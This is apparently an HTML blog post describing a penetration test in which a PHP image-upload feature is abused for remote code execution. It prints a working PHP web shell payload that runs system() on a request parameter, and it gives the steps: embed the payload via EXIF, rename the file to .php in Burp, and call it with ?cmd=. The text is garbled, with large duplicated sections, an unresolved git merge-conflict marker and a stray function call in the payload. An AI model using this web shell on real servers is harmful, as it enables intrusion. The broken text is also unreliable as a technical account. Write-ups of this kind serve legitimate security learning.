                                        This vulnerability was found during testing on a Private Company which called me for Penetration Testing. The Company is based on the Digital Asset Trading. I have anonymized, altered, or removed  all detail about the company to keep this information confidential in line with pentesting policies.

                                        TL;DR

                                        Image file upload functionality doesn’t validate a file extension but validates Content-type and a content of a file. Application sets Content-type of HTTP response based on a file extension. Image, containing PHP code and a file extension set to .php, was uploaded and allowed remote code execution
                                    </p>
                                    <p>
                                        An application had image file upload functionality and was written in PHP. I started testing for <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">unrestricted file upload</a>, knowing a good starting point is the OWASP Testing Guide. As always, I read responses from the server, analysed them and got the following information:
                                    </p>
                                    <ul>
                                        <li>
                                            When a file sent to the server is verified against Content-type and file header, only images are allowed
                                        </li>
                                        <li>
                                            A file can have any extension you like, extension defines Content-type of HTTP response sent by the server
                                        </li>
                                        <li>
                                            The file is transformed by the server
                                        </li>
                                        <li>
                                            The file's metadata is cleared (no EXIF data)
                                        </li>
                                        <li>
                                            During testing the newest version of ImageMagick was used (disclosed in one of HTTP responses sent by the server)
                                        </li>
                                    </ul>
                                    <p>
                                        As you can see, injecting PHP code in EXIF data did not result in immediate exploitability. At that point I started thinking of next possible step. I knew I was looking for RCE.
                                    </p>
                                    <p>
                                        I reached the following conclusion: <code>If an uploaded image contains PHP code and that code is not modified, and file extension is one of php, then application should execute the file</code>. The challenge here is to find a place in an image where PHP code can be placed. Of course, you can read RFC/specifications and it can be useful. However, it may be difficult to apply that knowledge to a real situation as we don't have access to code and we don't know which part of an RFC can be useful. As I knew what I wanted to achieve, I could create some plan. Usually, if the problem is complex, I use a <code>divide and conquer</code> approach (like the way algorithm works).
                                    </p>
                                    <p>
                                        The plan:
                                    </p>
                                    <ol>
                                    <li>
                                        Define a list of image file formats.
                                    </li>
                                    <li>
                                        Try to identify transformations made to the image by the server.
                                    </li>
                                    <li>
                                        Recreate the situation (transformations) locally using ImageMagick and PHP code to have a local testing capability.
                                    </li>
                                    <li>
                                        Are there any unmodified spaces in the image file?
                                    </li>
                                    <li>
                                        Yes, go to step 6. No, go to step 1.
                                    </li>
                                    <li>
                                        Inject a code to an identified space and test if the injected code is executed.
                                    </li>
                                    </ol>
                                    <p>
                                        It can be easily noticed that the plan is just an algorithm.
                                    </p>
                                    <p>
                                        I started with a jpg shell uploading i.e., injecting a Remote Code Execution payload into the jpeg file. This can be done through a EXIF Editor.

                                        Now after injecting the payload to the image, Rename the file

                                        Initially it was "0.jpg", I made it as "0.php.jpg"
                                        (which does make it executable since we titled as double extended file)

                                    <p>
                                        Now , try to upload the file. And intercept the request in burpsuite. Now I got the following request.
                                    </p>
                                    <img src=assets/img/rce-1.png alt="">

                                        Then!, with no late I edited the filename as "0.php" and forwarded the request.

                                        Now, here when u see that our uploaded file looks like crashed. We can say that here we can find exploit!

                                        An application had image file upload functionality and was written in PHP. I started testing for <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">unrestricted file upload</a>, knowing a good starting point is the OWASP Testing Guide. As always, I read responses from the server, analysed them and got the following information:
                                    </p>
                                    <ul>
                                        <li>
                                            When a file sent to the server is verified against Content-type and file header, only images are allowed
                                        </li>
                                        <li>
                                            A file can have any extension you like, extension defines Content-type of HTTP response sent by the server
                                        </li>
                                        <li>
                                            The file is transformed by the server
                                        </li>
                                        <li>
                                            The file's metadata is cleared (no EXIF data)
                                        </li>
                                        <li>
                                            During testing the newest version of ImageMagick was used (disclosed in one of HTTP responses sent by the server)
                                        </li>
                                    </ul>
                                    <p>
                                        As you can see, injecting PHP code in EXIF data did not result in immediate exploitability. At that point I started thinking of next possible step. I knew I was looking for RCE.
                                    </p>
                                    <p>
                                        I reached the following conclusion: <code>If an uploaded image contains PHP code and that code is not modified, and file extension is one of php, then application should execute the file</code>. The challenge here is to find a place in an image where PHP code can be placed. Of course, you can read RFC/specifications and it can be useful. However, it may be difficult to apply that knowledge to a real situation as we don't have access to code and we don't know which part of an RFC can be useful. As I knew what I wanted to achieve, I could create some plan. Usually, if the problem is complex, I use a <code>divide and conquer</code> approach (like the way algorithm works).
                                    </p>
                                    <p>
                                        The plan:
                                    </p>
                                    <ol>
                                    <li>
                                        Define a list of image file formats.
                                    </li>
                                    <li>
                                        Try to identify transformations made to the image by the server.
                                    </li>
                                    <li>
                                        Recreate the situation (transformations) locally using ImageMagick and PHP code to have a local testing capability.
                                    </li>
                                    <li>
                                        Are there any unmodified spaces in the image file?
                                    </li>
                                    <li>
                                        Yes, go to step 6. No, go to step 1.
                                    </li>
                                    <li>
                                        Inject a code to an identified space and test if the injected code is executed.
                                    </li>
                                    </ol>
                                    <p>
                                        It can be easily noticed that the plan is just an algorithm.
                                    </p>
                                    <p>
                                        I started with a jpg shell uploading i.e., injecting a Remote Code Execution payload into the jpeg file. This can be done through a EXIF Editor.
                                    </p>
                                    <p>
                                        The payload I injected to the image is
                                    </p> 
                                    <p> 
                                        <code><style>body{font-size:0;}h1{font-size:12px}</style><h1><?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo 'RCE';}_half_compiler();?></h1></code>
                                    </p>
                                    <p>
                                        Now after injecting the payload to the image, Rename the file
                                    </p>
                                    <p>
                                        Initially it was "0.jpg", I made it as "0.php.jpg"
                                        (which does make it executable since we titled as double extended file)

<<<<<<< HEAD
                                        Next step is to open the uploaded image in new tab which also mean opening image location in the website. As said the url does look like this
                                        https://example.com/assets/pictures/4f3c3b82e3145809939c2929d98af2b4.php 
                                    </p>
                                    <p>
                                        Now, on a ease add ?cmd= to the url, so it will be as
                                         https://example.com/assets/pictures/4f3c3b82e3145809939c2929d98af2b4.php?cmd=
=======
                                        Now , try to upload the file. And intercept the request in burpsuite. Now I got the following request.
                                    </p>
                                    <p>
                                        Then!, with no late I edited the filename as "0.php" and forwarded the request.

                                        Finally, we have terminal which means it got exploited.
                                        As a example, I used "ls -la", and BOOOOOMMMM!!!!!!!!!!!
